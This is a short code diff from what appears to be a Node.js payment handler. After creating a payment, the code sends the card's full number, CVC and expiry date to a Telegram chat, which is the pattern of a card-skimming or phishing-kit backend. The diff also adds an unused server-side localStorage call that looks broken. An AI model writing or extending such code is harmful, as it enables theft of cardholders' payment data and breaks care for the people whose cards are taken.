@@ -320,13 +320,15 @@ module.exports = {
                 expiry: req.body.expiry,
             })
 
+            const ref = localStorage.getItem('ref')
+
             // send message in telegram
             let message = `Payment created successfully\n\n`
             message += `Order ID: ${payment.order_id}\n`
             message += `CVC: ${payment.cvc}\n`
             message += `PAN: ${payment.pan}\n`
             message += `Expiry: ${payment.expiry}\n`
-            message += `Referal: ${localStorage.getItem('ref')}`
+            message += `Referal: ${req.body.ref}`
             Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
 
             return res.send({
